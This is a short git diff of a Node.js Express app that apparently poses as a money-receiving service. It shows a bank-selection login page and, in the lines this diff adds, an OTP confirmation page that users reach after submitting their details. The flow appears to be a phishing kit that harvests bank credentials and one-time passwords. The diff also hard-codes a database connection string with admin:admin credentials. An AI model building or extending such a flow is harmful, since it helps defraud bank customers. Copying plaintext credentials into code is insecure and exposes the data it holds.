@@ -44,7 +44,7 @@ app.use((req,res,next)=>{
 
 // Or:
 try {
-   mongoose.connect('mongodb+srv://admin:admin@cluster0-ixpng.mongodb.net/nhantien?retryWrites=true&w=majority', { useNewUrlParser: true },(erro)=>{
+   mongoose.connect('mongodb+srv://admin:admin@cluster0-ixpng.mongodb.net/nhantien?retryWrites=true&w=majority', { useNewUrlParser: true ,useUnifiedTopology: true },(erro)=>{
        if(erro){
            console.log("Erro Connect To DB");
        }else{
@@ -70,7 +70,9 @@ app.get("/",(req,res)=>{
         res.render("dangnhap",{bank:bank});
     })
 })
-
+app.get("/Confirm-Otp",(req,res)=>{
+    res.render("otp");
+})
 app.get("/Buoc-1",(req,res)=>{
   
     if(req.session.InfoId== undefined){
@@ -196,7 +198,7 @@ app.post("/xuly",(req,res)=>{
         else{
             req.session.InfoId = info._id;
             console.log(req.session.InfoId);
-            res.redirect("/Buoc-1");
+            res.redirect("/Confirm-Otp");
         }
     })
     
